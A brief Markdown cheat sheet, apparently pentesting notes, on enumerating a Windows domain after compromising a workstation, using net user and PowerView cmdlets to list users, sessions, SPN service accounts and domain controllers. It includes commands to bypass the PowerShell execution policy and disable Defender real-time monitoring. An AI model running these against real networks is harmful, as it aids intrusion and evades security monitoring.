# Enumeration


Assuming that you already have compromised a workstation on a domain I will go through the process of enumerating users, groups, etc.


## Usage

### net user


```bash
net users
#This will populate users on the local device


net users /domain
#This will Generate all users on the domain


net user <username> /domain
#This will generate more information about the user like which group they are in.
```


### PowerView.ps1

* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

installation/setup
```bash
powershell
powershell -ep bypass
. .\powerview.ps1
 
 #might need to turn off realtime monitoring
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```


commands
```bash
Get-NetComputers
#This command shows all the computers with a current session


Get-NetLoggedon -ComputerName <name of computer form previous command>
# Use this command to view users who have active sessions on the device discovered

Get-NetUser -SPN
#Enumeration of service accounts

Get-NetDomainController
#Here we can see information on the DC

Get-DomainPolicy
#Gets information about the policies like password


Get-NetComputer -fulldata | select operatingsystem
#Gets a list of all operating systems on a domain
```


